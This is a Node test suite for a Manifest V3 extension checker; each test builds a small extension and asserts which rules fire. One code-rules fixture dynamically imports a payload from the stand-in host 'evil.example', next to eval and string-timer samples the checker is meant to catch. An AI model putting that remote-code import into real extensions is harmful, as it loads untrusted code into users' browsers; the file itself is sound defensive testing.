"use strict";

// v3.4.0 — tools/check-mv3.mjs must FIND violations, not only report "OK".
// Each test writes a tiny extension into a fresh temp folder, runs the
// script on it with --json, and checks the reported rule ids.
// Resources: INIT mkdtemp per test, RELEASE rmSync in afterEach (always).

import { test, describe, beforeEach, afterEach } from "node:test";
import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { mkdtempSync, mkdirSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";

const SCRIPT = path.join(path.dirname(fileURLToPath(import.meta.url)), "..", "check-mv3.mjs");
const EXIT_FINDINGS = 1;

let dir = null;

function writeExt(files) {
    for (const [rel, content] of Object.entries(files)) {
        const abs = path.join(dir, rel);
        mkdirSync(path.dirname(abs), { recursive: true });
        writeFileSync(abs, typeof content === "string" ? content : JSON.stringify(content));
    }
}

function runCheck() {
    try {
        const out = execFileSync(process.execPath, [SCRIPT, "--ext", dir, "--json"], { stdio: "pipe" }).toString();
        return { code: 0, findings: JSON.parse(out).findings };
    } catch (e) {
        if (e.status !== EXIT_FINDINGS) throw e;
        return { code: e.status, findings: JSON.parse(e.stdout.toString()).findings };
    }
}

const rules = (findings) => new Set(findings.map(f => f.rule));
const MV3_BASE = { manifest_version: 3, name: "t", version: "1.0.0", background: { service_worker: "sw.js", type: "module" } };

beforeEach(() => { dir = mkdtempSync(path.join(tmpdir(), "check-mv3-")); });
afterEach(() => { if (dir) rmSync(dir, { recursive: true, force: true }); dir = null; });

describe("check-mv3 — manifest rules", () => {
    test("a clean MV3 extension passes", () => {
        writeExt({ "manifest.json": MV3_BASE, "sw.js": "chrome.runtime.onInstalled.addListener(() => {});\n" });
        const r = runCheck();
        assert.equal(r.code, 0);
        assert.deepEqual(r.findings, []);
    });
    test("an MV2 manifest trips M1–M6", () => {
        writeExt({
            "manifest.json": {
                manifest_version: 2, name: "t", version: "1",
                background: { scripts: ["bg.js"], persistent: false },
                browser_action: {},
                permissions: ["webRequestBlocking", "https://*/*"],
                content_security_policy: "script-src 'self' 'unsafe-eval'; object-src 'self'",
                web_accessible_resources: ["page.html"],
            },
            "bg.js": "",
        });
        const got = rules(runCheck().findings);
        for (const id of ["MV3-M1", "MV3-M2", "MV3-M3", "MV3-M4", "MV3-M5", "MV3-M6"]) assert.ok(got.has(id), id);
    });
    test("an MV3 CSP object with a remote script host trips M5", () => {
        writeExt({
            "manifest.json": { ...MV3_BASE, content_security_policy: { extension_pages: "script-src 'self' https://cdn.example.com; object-src 'self'" } },
            "sw.js": "",
        });
        assert.ok(rules(runCheck().findings).has("MV3-M5"));
    });
    test("a missing or non-array DNR ruleset trips M7", () => {
        writeExt({
            "manifest.json": { ...MV3_BASE, declarative_net_request: { rule_resources: [
                { id: "a", enabled: true, path: "rules/missing.json" },
                { id: "b", enabled: true, path: "rules/obj.json" },
            ] } },
            "sw.js": "",
            "rules/obj.json": { not: "an array" },
        });
        const m7 = runCheck().findings.filter(f => f.rule === "MV3-M7");
        assert.equal(m7.length, 2);
    });
});

describe("check-mv3 — code rules", () => {
    test("eval, Function, string timers, remote imports, MV2 APIs and SW DOM globals are all found", () => {
        writeExt({
            "manifest.json": MV3_BASE,
            "sw.js": [
                'import { x } from "./lib.js";',
                'import("https://evil.example/payload.js");',
                "eval('1');",
                "new Function('return 1');",
                "setTimeout('doIt()', 5);",
                "chrome.tabs.executeScript(1, {});",
                "const u = chrome.extension.getURL('a');",
                "localStorage.setItem('k', x);",
            ].join("\n"),
            "lib.js": "export const x = document.title;\n",
            "pages/p.html": '<script src="https://cdn.example.com/x.js"></script>',
            "pages/ok.js": "document.title = 'pages may use the DOM';\n",
        });
        const findings = runCheck().findings;
        const got = rules(findings);
        for (const id of ["MV3-C1", "MV3-C2", "MV3-C3", "MV3-C4"]) assert.ok(got.has(id), id);
        // DOM use is found through the import graph (lib.js), but never in a page script.
        const c4Files = findings.filter(f => f.rule === "MV3-C4").map(f => f.file);
        assert.ok(c4Files.includes("lib.js"));
        assert.ok(!c4Files.some(f => f.includes("pages")));
        // Two remote-code findings: the dynamic import and the <script src>.
        assert.equal(findings.filter(f => f.rule === "MV3-C2").length, 2);
    });
    test("typeof window is a feature test, not a DOM access", () => {
        writeExt({ "manifest.json": MV3_BASE, "sw.js": "export const inPage = typeof window !== 'undefined';\n" });
        assert.equal(runCheck().code, 0);
    });
    test("a file that cannot be parsed is reported, not silently skipped", () => {
        writeExt({ "manifest.json": MV3_BASE, "sw.js": "", "broken.js": "function (" });
        assert.ok(rules(runCheck().findings).has("MV3-C5"));
    });
});
